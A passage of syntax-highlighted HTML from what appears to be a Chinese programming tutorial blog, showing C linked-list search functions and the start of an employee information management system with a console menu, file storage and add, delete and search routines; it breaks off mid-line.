class="built_in">printf</span>(<span class="string">&quot;%4d   %6s    %6s    %8s   %10.3f \n&quot;</span>,b-&gt;id,b-&gt;name,(b-&gt;sex==<span class="number">0</span>)?<span class="string">&quot;male&quot;</span>:<span class="string">&quot;female&quot;</span>,b-&gt;position,b-&gt;salary_total);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> c=b;</span><br><span class="line">b=c-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!find) <span class="built_in">printf</span>(<span class="string">&quot;没有找到 姓名 为 %s 的数据\n\n&quot;</span>,name1);</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">find_posi</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">char</span> posi[<span class="number">100</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">b</span>,*<span class="title">c</span>,*<span class="title">head</span>;</span></span><br><span class="line"><span class="type">bool</span> find=<span class="literal">false</span>;</span><br><span class="line">head=c=p;</span><br><span class="line">b=head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(b!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(posi,b-&gt;position) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">find=<span class="literal">true</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到 职称为 为 [%s] 的数据\n\n&quot;</span>,b-&gt;position);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;职工号   姓名     性别         职称       **实发工资**       \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d   %6s    %6s    %8s   %10.3f \n&quot;</span>,b-&gt;id,b-&gt;name,(b-&gt;sex==<span class="number">0</span>)?<span class="string">&quot;male&quot;</span>:<span class="string">&quot;female&quot;</span>,b-&gt;position,b-&gt;salary_total);</span><br><span class="line">&#125;</span><br><span class="line">c=b;</span><br><span class="line">b=c-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!find) <span class="built_in">printf</span>(<span class="string">&quot;没有找到 职称 为 %s 的数据\n\n&quot;</span>,posi);</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="综合训练五：职工信息管理系统"><a href="#综合训练五：职工信息管理系统" class="headerlink" title="综合训练五：职工信息管理系统"></a>综合训练五：职工信息管理系统</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发者：WE-ubytt</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> ID;<span class="comment">// 工号</span></span><br><span class="line"><span class="type">char</span> Name[<span class="number">50</span>];<span class="comment">// 姓名</span></span><br><span class="line"><span class="type">char</span> Sex[<span class="number">10</span>];<span class="comment">// 性别</span></span><br><span class="line"><span class="type">int</span> Age;<span class="comment">// 年龄</span></span><br><span class="line"><span class="type">char</span> Education[<span class="number">20</span>];<span class="comment">// 学历</span></span><br><span class="line"><span class="type">char</span> Post[<span class="number">20</span>];<span class="comment">// 职务</span></span><br><span class="line"><span class="type">int</span> Wage;<span class="comment">// 工资</span></span><br><span class="line"><span class="type">char</span> Room[<span class="number">50</span>];<span class="comment">// 住址</span></span><br><span class="line"><span class="type">char</span> Telephone[<span class="number">20</span>];<span class="comment">// 电话</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span><span class="comment">// 指针域</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node <span class="built_in">list</span>;<span class="comment">// 链表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Read_FILE</span><span class="params">(node* L)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存文件</span></span><br><span class="line"><span class="type">int</span>  <span class="title function_">Save_FILE</span><span class="params">(node* L)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主菜单界面</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Add</span><span class="params">(node* L, node e)</span>;<span class="comment">// 功能</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Add_Printf</span><span class="params">()</span>;<span class="comment">// 界面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delete_Printf</span><span class="params">(node* L)</span>;<span class="comment">// 界面</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delete</span><span class="params">(node* s)</span>;<span class="comment">// 功能</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Fix</span><span class="params">(node* L)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Search_Printf</span><span class="params">(node* L)</span>;<span class="comment">// 界面</span></span><br><span class="line">node* <span class="title function_">Search_id</span><span class="params">(<span class="type">int</span> id, node* L)</span>;<span class="comment">// 按工号进行查找</span></span><br><span class="line">node* <span class="title function_">Search_name</span><span class="params">(<span class="type">char</span> name[], node* L)</span>;<span class="comment">// 按姓名进行查找</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">(node* L)</span>;<span class="comment">// 功能</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print_Printf</span><span class="params">()</span>;<span class="comment">// 界面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 排序职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Sort</span><span class="params">(node* L)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">cmp_big_Wage</span><span class="params">(node e1, node e2)</span>;<span class="comment">// 工资从大到小</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">cmp_small_Wage</span><span class="params">(node e1, node e2)</span>;<span class="comment">// 工资从小到大</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 退出管理系统</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">goodbye</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line">Read_FILE(&amp;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">welcome();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">switch</span> (choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">// 增加职工信息</span></span><br><span class="line">Add_Printf();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">// 删除职工信息</span></span><br><span class="line">Delete_Printf(&amp;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">// 修改职工信息</span></span><br><span class="line">Fix(&amp;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:<span class="comment">// 查询职工信息</span></span><br><span class="line">Search_Printf(&amp;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:<span class="comment">// 输出职工信息</span></span><br><span class="line">Print(&amp;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:<span class="comment">// 排序职工信息</span></span><br><span class="line">Sort(&amp;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">// 退出职工系统</span></span><br><span class="line">goodbye();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;是否需要继续操作？（Yes：1 / No：0)：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;****************************************************************\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***********             职工信息管理系统             ***********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***********          1 ---- 增加职工信息             ***********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***********          2 ---- 删除职工信息             ***********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***********          3 ---- 修改职工信息             ***********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***********          4 ---- 查询职工信息             ***********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***********          5 ---- 输出职工信息             ***********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***********          6 ---- 排序职工信息             ***********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***********          0 ---- 退出管理系统             ***********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;****************************************************************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择想要实现的功能（数字）：&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Read_FILE</span><span class="params">(node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* pfRead = fopen(<span class="string">&quot;worker_information.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">node st;</span><br><span class="line">node* s;</span><br><span class="line">node* t = L;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pfRead == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">fscanf</span>(pfRead, <span class="string">&quot;%d %s %s %d %s %s %d %s %s&quot;</span>, &amp;st.ID, st.Name, st.Sex, &amp;st.Age, st.Education, st.Post, &amp;st.Wage, st.Room, st.Telephone) != EOF)</span><br><span class="line">&#123;</span><br><span class="line">s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line"></span><br><span class="line">*s = st;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尾插法</span></span><br><span class="line">t-&gt;next = s;</span><br><span class="line">t = s;</span><br><span class="line">t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存文件</span></span><br><span class="line"><span class="type">int</span>  <span class="title function_">Save_FILE</span><span class="params">(node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* pfWrite = fopen(<span class="string">&quot;worker_information.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pfWrite == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node* p = L-&gt;next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(pfWrite, <span class="string">&quot;%d %s %s %d %s %s %d %s %s\n&quot;</span>, p-&gt;ID, p-&gt;Name, p-&gt;Sex, p-&gt;Age, p-&gt;Education, p-&gt;Post, p-&gt;Wage, p-&gt;Room, p-&gt;Telephone);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Add_Printf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">node st;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入新增职工的相关信息：\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;工号：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;st.ID);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st.Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st.Sex);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;年龄：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;st.Age);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;学历：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st.Education);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;职务：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st.Post);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;工资：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;st.Wage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st.Room);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;st.Telephone);</span><br><span class="line"></span><br><span class="line">Add(&amp;<span class="built_in">list</span>, st);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Add</span><span class="params">(node* L, node e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 头插法</span></span><br><span class="line">node* p = L;</span><br><span class="line">node* s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">*s = e;</span><br><span class="line"></span><br><span class="line">s-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = s;</span><br><span class="line"></span><br><span class="line">Save_FILE(L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delete_Printf</span><span class="params">(node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">node* p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要删除的职工的工号：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">node* st = Search_id(id, L);</span><br><span class="line">p = st;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (st == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查无此人！\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">st = st-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|学号\t|姓名\t|性别\t|年龄\t|学历\t|职位\t|工资\t|住址\t\t\t|电话\t\t|\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|%d\t|%s\t|%s\t|%d\t|%s\t|%s\t|%d\t|%s\t\t|%s\t|\n&quot;</span>, st-&gt;ID, st-&gt;Name, st-&gt;Sex, 